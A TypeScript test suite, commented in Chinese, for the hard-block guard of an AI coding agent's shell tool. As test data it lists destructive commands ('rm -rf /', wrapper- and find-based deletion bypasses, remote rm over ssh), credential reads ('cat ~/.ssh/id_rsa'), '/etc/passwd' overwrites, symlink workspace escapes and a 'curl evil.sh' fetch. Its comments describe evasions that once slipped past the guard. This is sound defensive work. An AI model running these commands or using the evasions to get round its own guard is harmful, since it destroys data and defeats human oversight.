/**
 * 硬拦截的测试。
 *
 * 这一层出错的代价是不对称的：漏一条等于放行 rm -rf，误报一条只是多问一句。
 * 所以测试重点在「该拦的确实拦住了」，尤其是审批粒度那条 ——
 * 放行 `git add` 绝不能顺带放行 `git add . && rm -rf /`。
 */

import { describe, expect, test } from "bun:test";
import { chmodSync, mkdtempSync, mkdirSync, readFileSync, symlinkSync, writeFileSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { join, resolve } from "node:path";

import { ApprovalPolicy } from "./approval.ts";
import {
  builtinRules,
  checkCommand,
  checkTool,
  commandClass,
  commandClasses,
  commandName,
  loadGuardConfig,
  splitCommands,
  writeTargets,
  type GuardConfig,
  type GuardContext,
} from "./guard.ts";
import { loadHooks, matchingHooks, runHook, runPreToolUse } from "./hooks.ts";
import { AgentLoop, type Gate, type Presenter } from "./loop.ts";
import { emptyUsage, type ModelClient } from "./model.ts";
import { defaultRegistry, makeContext } from "./tools/index.ts";

const root = mkdtempSync(join(tmpdir(), "ph-guard-"));

const config: GuardConfig = {
  rules: builtinRules(),
  protectedPaths: [".git", ".omnisci", "~/.ssh", "~/.netrc", "~/.claude"],
  // 工作区自己在 /tmp 底下，所以这里不能把 /tmp 列成「外部可写」，
  // 否则整个工作区都落进豁免区，越界检查就测不出东西了。
  writableOutside: ["/dev/null"],
};
const ctx: GuardContext = { root: resolve(root), config };

describe("命令拆分", () => {
  test("按 && || ; | 拆开", () => {
    expect(splitCommands("git add . && git commit -m x")).toEqual(["git add .", "git commit -m x"]);
    expect(splitCommands("a; b | c || d")).toEqual(["a", "b", "c", "d"]);
  });

  test("引号里的操作符不算分隔符", () => {
    expect(splitCommands(`echo "a && b"`)).toEqual([`echo "a && b"`]);
  });

  test("带重定向 / 变量 / 通配 / 控制流的整条不拆，当一条判", () => {
    expect(splitCommands("cat x > y && z")).toHaveLength(1);
    expect(splitCommands("echo $HOME && z")).toHaveLength(1);
    expect(splitCommands("ls *.ts && z")).toHaveLength(1);
    expect(splitCommands("for f in a; do b; done")).toHaveLength(1);
  });

  test("剥掉 sudo / env / 绝对路径拿到真正跑的程序", () => {
    expect(commandName("sudo rm -rf /")).toBe("rm");
    expect(commandName("FOO=1 /bin/rm x")).toBe("rm");
    expect(commandName("nohup python3 t.py")).toBe("python3");
  });

  // 光靠「以 - 开头就跳过」会把选项的**取值**留下来当程序名：
  // `env -u FOO bash` 里跳掉 -u 之后第一个裸 token 是 FOO。
  // 于是 commandName 返回 FOO，innerCommand 不认它是包装器，内层一次都没判过。
  test("包装器的选项取值不能被当成程序名", () => {
    expect(commandName("env -u FOO bash -c 'x'")).toBe("bash");
    expect(commandName("sudo -u nobody bash -lc 'x'")).toBe("bash");
    expect(commandName("nice -n 10 bash -c 'x'")).toBe("bash");
    expect(commandName("timeout 5 bash -c 'x'")).toBe("bash");
    expect(commandName("ionice -c 2 -n 7 rm x")).toBe("rm");
    expect(commandName("xargs -I {} rm {}")).toBe("rm");
    expect(commandName("sudo -- rm -rf /")).toBe("rm");
    // 捆绑写法的取值在同一个 token 里，不该再多吃一个
    expect(commandName("nice -10 rm x")).toBe("rm");
    expect(commandName("stdbuf -oL rm x")).toBe("rm");
    // 取值跟程序名撞名也不能错位
    expect(commandName("sudo -u bash bash -c 'x'")).toBe("bash");
  });
});

describe("危险模式表", () => {
  const deny = (cmd: string) => checkCommand(cmd, ctx);

  test("rm 硬拒，并且给出可用的改写建议", () => {
    const d = deny("rm -rf build");
    expect(d.verdict).toBe("deny");
    expect(d.rule).toBe("rm");
    // 光拒绝会让模型卡死或者去找绕路方案，理由里必须带替代命令
    expect(d.reason).toMatch(/trash|\.trash/);
  });

  test("sudo 和绝对路径绕不过去", () => {
    expect(deny("sudo rm -rf /").verdict).toBe("deny");
    expect(deny("/bin/rm x").verdict).toBe("deny");
  });

  test("rm 的各条绕过路径全部堵死", () => {
    // 这几条都是实测漏过的，每条都是一次真实的删除能力。
    // 「rm 在任何情况下都不可以」要成立，光拦 rm 这三个字母不够。
    for (const cmd of [
      "rmdir olddir",                       // 换个名字的 rm
      "unlink important.txt",               // 换个名字的 rm
      `\\rm -rf x`,                         // 反斜杠绕 alias
      `sudo \\rm -rf /`,
      "find . -name '*.log' -delete",       // find 自己就能删，不经过 rm
      "find . -name '*.tmp' -exec rm {} \\;", // -exec 后面的 rm 不在命令位置上
      "find . -execdir rm {} +",
      "find . | xargs rm",
      `bash -c "find . -delete"`,           // 再包一层
      `ssh gpu-a "rm -rf ~/data"`,            // 远端的 rm 一样不可恢复
    ]) {
      expect(checkCommand(cmd, ctx).verdict).toBe("deny");
    }
  });

  test("find 的非删除用法不误伤", () => {
    expect(deny("find . -name '*.ts' -print").verdict).toBe("allow");
    expect(deny("find . -type f | head").verdict).toBe("allow");
    expect(deny("find . -exec grep -l TODO {} +").verdict).toBe("allow");
  });

  test("git clean 的 -fdx 写法要匹配上", () => {
    // 之前漏在这儿：模式匹到 -fd 就停，末尾的词尾断言撞上 x 直接失配
    expect(deny("git clean -fdx").verdict).toBe("ask");
    expect(deny("git clean -fd").verdict).toBe("ask");
    expect(deny("git clean -n").verdict).toBe("allow"); // -n 是 dry run
  });

  test("rsync --delete 要问，普通 rsync 不问", () => {
    expect(deny("rsync -av --delete a/ b/").verdict).toBe("ask");
    expect(deny("rsync -avP src/ dst/").verdict).toBe("allow");
  });

  test("只在命令位置匹配，npm rm 不算 rm", () => {
    expect(deny("npm rm lodash").verdict).not.toBe("deny");
    expect(deny("grep rm notes.txt").verdict).not.toBe("deny");
  });

  test("藏在 && 后面的 rm 照样拦住", () => {
    const d = deny("git add . && rm -rf /");
    expect(d.verdict).toBe("deny");
    expect(d.rule).toBe("rm");
  });

  test("带选项的包装器绕不过去", () => {
    // 实测漏过：简单形式（bash -c、sudo rm）一直拦得住，**带选项的包装**全部放行。
    // 根因是选项取值被当成了程序名，于是后面那层 bash -c 不再被识别为包装器。
    for (const cmd of [
      `env -u FOO bash -c "rm -rf /tmp/target"`,
      `env -i bash -c "rm -rf /"`,
      `sudo -u nobody bash -lc "rm -rf /tmp/target"`,
      `nice -n 10 bash -c "rm -rf /tmp/target"`,
      `timeout 5 bash -c "rm -rf /tmp/target"`,
      `ionice -c 2 -n 7 bash -c "rm -rf /"`,
      // 不带内层 shell 的形态：rm 既不在行首也不在操作符后面，
      // 命令位置匹配够不着，得靠剥掉包装之后再判一遍
      "env -u FOO rm -rf /",
      "sudo -u nobody rm -rf /",
      "nice -n 10 rm -rf /",
      "timeout 5 rm -rf /",
      "env -u PATH -C /tmp qdel 123",
    ]) {
      expect(checkCommand(cmd, ctx).verdict).toBe("deny");
    }
  });

  test("包装器不误伤正常命令", () => {
    expect(deny("env FOO=1 python3 train.py").verdict).toBe("allow");
    expect(deny("nice -n 10 python3 train.py").verdict).toBe("allow");
    expect(deny("timeout 30 python3 train.py").verdict).toBe("allow");
    expect(deny("sudo -u nobody ls /tmp").verdict).toBe("allow");
    expect(deny("env -u LD_PRELOAD ls").verdict).toBe("allow");
  });

  test("藏在 bash -c 引号里的 rm 也拦住", () => {
    // 命令位置匹配抓不到引号里的东西，得把内层抠出来单独判
    expect(deny(`bash -c "rm -rf /"`).verdict).toBe("deny");
    expect(deny(`sh -c 'cd x && rm -rf y'`).verdict).toBe("deny");
    expect(deny(`bash -lc "ls -la"`).verdict).toBe("allow");
  });

  test("ssh 到远端的 rm 也拦住，但远端的普通操作照常放行", () => {
    // rm 在哪台机器上都一样不可恢复
    expect(deny(`ssh gpu-a "rm -rf ~/data"`).verdict).toBe("deny");
    expect(deny(`ssh -p 22 gpu-a 'qdel 123'`).verdict).toBe("deny");
    // 远端路径是另一台机器的文件系统，不能拿本地工作区去判越界，
    // 否则 ssh 这个第二高频命令基本全被误伤
    expect(deny(`ssh gpu-a "cp /data/a /data/b"`).verdict).toBe("allow");
    expect(deny(`ssh gpu-b 'nvidia-smi'`).verdict).toBe("allow");
  });

  test("随仓库发的示例规则文件是活的：装上之后确实生效", () => {
    // 这两条是机器专属策略，不在内置规则里（内置规则不该假设别人的环境）。
    // 但示例文件必须真能用，所以这里按用户的装法加载一次再判。
    const file = join(root, "guard-rules.json");
    writeFileSync(file, readFileSync(resolve(import.meta.dir, "..", "guard-rules.example.json"), "utf-8"));
    const loaded = loadGuardConfig(file);
    const withExample: GuardContext = { root: resolve(root), config: loaded };

    expect(checkCommand("pdflatex main.tex", withExample).verdict).toBe("deny");
    expect(checkCommand("docker pull texlive/texlive", withExample).verdict).toBe("deny");
    // 内置规则没被示例文件顶掉
    expect(checkCommand("rm -rf /tmp/x", withExample).verdict).toBe("deny");
  });

  test("内置规则不含任何机器专属策略", () => {
    // 公开发行的默认规则里出现某台机器的前提，用户会被莫名其妙地拦住。
    const ids = builtinRules().map((r) => r.id);
    expect(ids).not.toContain("latex");
    expect(ids).not.toContain("tex-acquire");
    expect(ids).not.toContain("latex-local");
    for (const rule of builtinRules()) {
      expect(rule.reason).not.toMatch(/本机|这台机器|共享 GPU/);
    }
  });

  test("qdel 拒，理由里要求先 qstat 确认 submit dir", () => {
    const d = deny("qdel 12345");
    expect(d.verdict).toBe("deny");
    expect(d.reason).toMatch(/qstat/);
  });

  test("truncate 拒，理由里点名 mtime", () => {
    const d = deny("truncate -s 0 big.ckpt");
    expect(d.verdict).toBe("deny");
    expect(d.reason).toMatch(/mtime/);
  });

  test("git push 是问不是拒", () => {
    expect(deny("git push origin main").verdict).toBe("ask");
    expect(deny("git status").verdict).toBe("allow");
  });
});

describe("路径", () => {
  test("写入越出工作区就拒，并点名越界路径", () => {
    const d = checkCommand("cp a.txt /etc/passwd", ctx);
    expect(d.verdict).toBe("deny");
    expect(d.rule).toBe("write-outside-workspace");
    expect(d.reason).toMatch(/\/etc\/passwd/);
  });

  test("往工作区里写不拦", () => {
    expect(checkCommand("cp a.txt b.txt", ctx).verdict).toBe("allow");
  });

  test("受保护路径写入拒、读取问", () => {
    expect(checkCommand("cp x .git/config", ctx).verdict).toBe("deny");
    expect(checkCommand("cat ~/.ssh/id_rsa", ctx).verdict).toBe("ask");
  });

  test("经符号链接写到工作区外也拒", () => {
    // 只做词法解析（path.resolve）的话，root/link/x 字面上还在 root 底下，
    // 于是 write-outside-workspace 放行，实际写到了链接指向的地方。
    // 不需要谁来构造：git 能携带符号链接，node_modules 里遍地都是，
    // 模型自己 ln -s 也不受拦。文件工具那边早就 realpath 了，shell 这条路漏着。
    const outside = mkdtempSync(join(tmpdir(), "ph-escape-"));
    symlinkSync(outside, join(root, "escape-link"));

    const d = checkCommand("printf x > escape-link/escaped.txt", ctx);
    expect(d.verdict).toBe("deny");
    expect(d.rule).toBe("write-outside-workspace");

    // 指回工作区内部的符号链接不能误伤
    mkdirSync(join(root, "real-sub"), { recursive: true });
    symlinkSync(join(root, "real-sub"), join(root, "inside-link"));
    expect(checkCommand("printf x > inside-link/ok.txt", ctx).verdict).toBe("allow");
  });

  test("受保护路径经符号链接也算命中", () => {
    // root/creds -> ~/.ssh：词法上是工作区内的普通目录，realpath 之后才看得出来
    symlinkSync(join(homedir(), ".ssh"), join(root, "creds"));
    expect(checkCommand("cp x creds/authorized_keys", ctx).verdict).toBe("deny");
  });

  test("chmod -R 打到家目录以上拒", () => {
    const d = checkCommand("chmod -R 777 ~", ctx);
    expect(d.verdict).toBe("deny");
    expect(d.rule).toBe("chmod-recursive-home");
  });

  test("> 新建文件放行，> 覆盖已存在的文件要问", () => {
    writeFileSync(join(root, "exists.log"), "old");
    expect(checkCommand("python3 t.py > fresh.log", ctx).verdict).toBe("allow");
    const d = checkCommand("python3 t.py > exists.log", ctx);
    expect(d.verdict).toBe("ask");
    expect(d.rule).toBe("overwrite-existing");
    // 追加不该被拦，不然模型连日志都没法续写
    expect(checkCommand("python3 t.py >> exists.log", ctx).verdict).toBe("allow");
  });

  test("重定向目标能抠出来", () => {
    expect(writeTargets("cat a > b").map((t) => t.path)).toEqual(["b"]);
    expect(writeTargets("cat a >b").map((t) => t.path)).toEqual(["b"]);
    expect(writeTargets("tee out.txt").map((t) => t.path)).toEqual(["out.txt"]);
    expect(writeTargets("mv src dst").map((t) => t.path)).toEqual(["dst"]);
    expect(writeTargets("python3 t.py 2> err.log").map((t) => t.path)).toEqual(["err.log"]);
    // 2>&1 是接 fd，不是写文件
    expect(writeTargets("python3 t.py 2>&1")).toEqual([]);
  });

  test("文件工具也走同一套：写 .git 拒，读 .git 问", () => {
    expect(checkTool("write_file", { path: ".git/config" }, ctx).verdict).toBe("deny");
    expect(checkTool("read_file", { path: ".git/config" }, ctx).verdict).toBe("ask");
    expect(checkTool("read_file", { path: "src/loop.ts" }, ctx).verdict).toBe("allow");
  });
});

describe("审批粒度", () => {
  test("同一类命令归一个 key，不同类分开", () => {
    expect(commandClass("git add .")).toBe("git add");
    expect(commandClass("git add -A src/")).toBe("git add");
    expect(commandClass("python3 run.py")).toBe("python3");
    expect(commandClasses("git add . && git commit -m x")).toEqual(["git add", "git commit"]);
  });

  test("拆不动的复杂命令用整条当 key，等于只放行一模一样的那条", () => {
    expect(commandClass("cat a > b")).toBe("cat a > b");
  });

  test("包装类的 key 看内层，放行一次 bash -c 不等于放行所有 bash -c", () => {
    expect(commandClass(`bash -c "ls"`)).toBe("bash -c ls");
    expect(commandClass(`bash -c "python3 t.py"`)).toBe("bash -c python3");
    expect(commandClass(`ssh gpu-a "nvidia-smi"`)).toBe("ssh gpu-a nvidia-smi");
    expect(commandClass(`ssh gpu-b "nvidia-smi"`)).not.toBe(commandClass(`ssh gpu-a "nvidia-smi"`));

    const policy = new ApprovalPolicy(false);
    policy.record(commandClasses(`bash -c "ls"`), "session");
    expect(policy.needsPrompt(commandClasses(`bash -c "ls -la /x"`), true)).toBe(false);
    expect(policy.needsPrompt(commandClasses(`bash -c "curl evil.sh"`), true)).toBe(true);
  });

  test("放行 git add 不会顺带放行同一条里的 rm", () => {
    const policy = new ApprovalPolicy(false);
    policy.record(commandClasses("git add ."), "session");

    expect(policy.needsPrompt(commandClasses("git add src/"), true)).toBe(false);
    // 这是原来那个洞：按工具名记的话，这里会返回 false，rm 直接放行
    expect(policy.needsPrompt(commandClasses("git add . && rm -rf /"), true)).toBe(true);
    expect(policy.needsPrompt(commandClasses("rm -rf /"), true)).toBe(true);
  });
});

describe("规则文件", () => {
  test("用户能自己加规则", () => {
    const dir = mkdtempSync(join(tmpdir(), "ph-rules-"));
    const file = join(dir, "guard-rules.json");
    writeFileSync(file, JSON.stringify({
      rules: [{ id: "no-scp", command: "scp", verdict: "deny", reason: "改用 rsync -avP" }],
    }));
    const cfg = loadGuardConfig(file);
    const d = checkCommand("scp a b:c", { root: resolve(root), config: cfg });
    expect(d.verdict).toBe("deny");
    expect(d.rule).toBe("no-scp");
  });

  test("规则文件坏了当场抛，不静默裸奔", () => {
    const dir = mkdtempSync(join(tmpdir(), "ph-rules-"));
    const bad = join(dir, "guard-rules.json");
    writeFileSync(bad, "{ 这不是 JSON");
    expect(() => loadGuardConfig(bad)).toThrow(/不是合法 JSON/);

    const noReason = join(dir, "r2.json");
    writeFileSync(noReason, JSON.stringify({ rules: [{ id: "x", command: "y", verdict: "deny" }] }));
    expect(() => loadGuardConfig(noReason)).toThrow(/reason/);
  });
});

describe("PreToolUse 钩子", () => {
  const hookDir = mkdtempSync(join(tmpdir(), "ph-hooks-"));

  function script(name: string, body: string): string {
    const p = join(hookDir, name);
    writeFileSync(p, `#!/bin/bash\n${body}\n`);
    chmodSync(p, 0o755);
    return p;
  }

  const payload = { tool_name: "bash", tool_input: { command: "shred x.txt" }, cwd: hookDir };

  test("exit 2 + stderr 当硬拒，stderr 就是理由", () => {
    const p = script("two.sh", 'echo "别这么干" >&2; exit 2');
    return runHook({ command: p }, payload).then((r) => {
      expect(r.verdict).toBe("deny");
      expect(r.reason).toBe("别这么干");
    });
  });

  test("exit 0 + stdout JSON 也当硬拒（Claude Code 的钩子多数走这套）", async () => {
    // 形状是：exit 0，决定和理由都在 stdout 的 JSON 里。
    // 只认 exit 2 的话这个脚本搬过来会被当成放行，钩子静默失效。
    const p = script("json.sh", `cat >/dev/null; echo '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"这台机器上不跑 X"}}'; exit 0`);
    const r = await runHook({ command: p }, payload);
    expect(r.verdict).toBe("deny");
    expect(r.reason).toBe("这台机器上不跑 X");
  });

  test("钩子从 stdin 拿得到工具名和参数", async () => {
    // 不用 jq 断言，免得测试依赖当前机器装没装 jq
    const p = script("echo.sh",
      `IN=$(cat)\n` +
      `[[ "$IN" == *'"tool_name":"bash"'* && "$IN" == *shred* ]] && { echo "看到了" >&2; exit 2; }\n` +
      `exit 0`);
    const r = await runHook({ command: p }, payload);
    expect(r.verdict).toBe("deny");
    expect(r.reason).toBe("看到了");
  });

  test("exit 0 无输出就是放行", async () => {
    const p = script("ok.sh", "cat >/dev/null; exit 0");
    expect((await runHook({ command: p }, payload)).verdict).toBe("allow");
  });

  test("其他非零当警告，放行但要报出来", async () => {
    const p = script("broken.sh", 'echo "jq: not found" >&2; exit 127');
    const r = await runHook({ command: p }, payload);
    expect(r.verdict).toBe("allow");
    expect(r.warning).toMatch(/127/);
  });

  test("超时按拒绝处理，安全闸卡住时放行更危险", async () => {
    const p = script("hang.sh", "sleep 30");
    const r = await runHook({ command: p, timeout: 0.4 }, payload);
    expect(r.verdict).toBe("deny");
    expect(r.rule).toBe("hook-timeout");
  });

  test("matcher 不分大小写，Claude Code 那边写惯的 Bash 也认", () => {
    const hooks = [{ matcher: "Bash", hooks: [{ command: "true" }] }];
    expect(matchingHooks(hooks, "bash")).toHaveLength(1);
    expect(matchingHooks(hooks, "read_file")).toHaveLength(0);
    expect(matchingHooks([{ hooks: [{ command: "true" }] }], "read_file")).toHaveLength(1);
  });

  test("多个钩子取最严的，deny 短路", async () => {
    const ok = script("ok2.sh", "cat >/dev/null; exit 0");
    const no = script("no2.sh", 'cat >/dev/null; echo "不行" >&2; exit 2');
    const r = await runPreToolUse(
      [{ hooks: [{ command: ok }, { command: no }, { command: ok }] }],
      payload,
    );
    expect(r.verdict).toBe("deny");
  });

  test("配置文件形状跟 Claude Code 一致", () => {
    const dir = mkdtempSync(join(tmpdir(), "ph-settings-"));
    const f = join(dir, "settings.json");
    writeFileSync(f, JSON.stringify({
      hooks: { PreToolUse: [{ matcher: "bash", hooks: [{ type: "command", command: "/x.sh" }] }] },
    }));
    expect(loadHooks(f)).toHaveLength(1);
    expect(loadHooks(join(dir, "nope.json"))).toEqual([]);
  });
});

/**
 * 模块单测过了不代表拦截缝真的接上了。这几条走完整的 AgentLoop：
 * 假模型发一个工具调用，看它到底有没有跑起来。
 */
describe("端到端：拦截缝接没接上", () => {
  function fakeModel(calls: Array<{ name: string; args: unknown }>) {
    let turn = 0;
    return {
      streamTurn: async () => {
        if (turn++ === 0) {
          return {
            message: {
              role: "assistant",
              content: null,
              tool_calls: calls.map((c, i) => ({
                id: `call_${i}`,
                type: "function",
                function: { name: c.name, arguments: JSON.stringify(c.args) },
              })),
            },
            finishReason: "tool_calls",
            usage: emptyUsage(),
          };
        }
        return { message: { role: "assistant", content: "完事" }, finishReason: "stop", usage: emptyUsage() };
      },
    } as unknown as ModelClient;
  }

  const silent: Presenter = {
    turnStart() {}, textDelta() {}, textDone() {}, toolStart() {}, toolResult() {},
  };

  async function runWith(command: string, gate: Partial<Gate> = {}) {
    const reg = await defaultRegistry();
    const messages: unknown[] = [];
    const loop = new AgentLoop(
      fakeModel([{ name: "bash", args: { command } }]),
      reg,
      makeContext(root),
      // autoApprove：证明硬拦截不吃这一套
      new ApprovalPolicy(true),
      silent,
      () => {},
      { guard: ctx, ...gate },
    );
    await loop.run(messages);
    return messages.find((m) => (m as { role?: string }).role === "tool") as { content: string };
  }

  test("rm 根本没跑起来，文件还在，理由带着改写建议回给模型", async () => {
    const victim = join(root, "victim.txt");
    writeFileSync(victim, "别删我");
    const toolMsg = await runWith(`rm -f ${victim}`);
    expect(toolMsg.content).toStartWith("BLOCKED [rm]");
    expect(toolMsg.content).toMatch(/trash|\.trash/);
    expect(await Bun.file(victim).text()).toBe("别删我"); // 命令确实没执行
  });

  test("--auto-approve 也拦得住：硬拦截跑在审批门之前", async () => {
    const toolMsg = await runWith("shred -u secret.txt");
    expect(toolMsg.content).toStartWith("BLOCKED [shred]");
  });

  test("正常命令照常跑", async () => {
    const toolMsg = await runWith("echo 我还活着");
    expect(toolMsg.content).toContain("我还活着");
  });

  test("需要单独点头的调用在子 agent 里当拒绝，不去弹一个没人应答的框", async () => {
    const toolMsg = await runWith("git push origin main", { noAsk: true });
    expect(toolMsg.content).toStartWith("BLOCKED:");
    expect(toolMsg.content).toMatch(/交回上级/);
  });

  test("钩子说拒就拒，理由原样回给模型", async () => {
    const hookDir = mkdtempSync(join(tmpdir(), "ph-e2e-"));
    const p = join(hookDir, "no.sh");
    writeFileSync(p, `#!/bin/bash\ncat >/dev/null\necho '{"hookSpecificOutput":{"permissionDecision":"deny","permissionDecisionReason":"钩子说不行"}}'\nexit 0\n`);
    chmodSync(p, 0o755);
    const toolMsg = await runWith("echo hi", { hooks: [{ matcher: "bash", hooks: [{ command: p }] }] });
    expect(toolMsg.content).toContain("钩子说不行");
  });
});

describe("目录形状", () => {
  test("工作区内的普通操作不该被误伤", () => {
    mkdirSync(join(root, "src"), { recursive: true });
    for (const cmd of [
      "ls -la",
      "git status",
      "python3 run_annotate.py --pilot 12",
      "grep -rn foo src/",
      "bun test",
      "ssh gpu-a 'nvidia-smi'",
      "qstat -u $USER",
      "mkdir -p out && cd out",
    ]) {
      expect(checkCommand(cmd, ctx).verdict).toBe("allow");
    }
  });
});
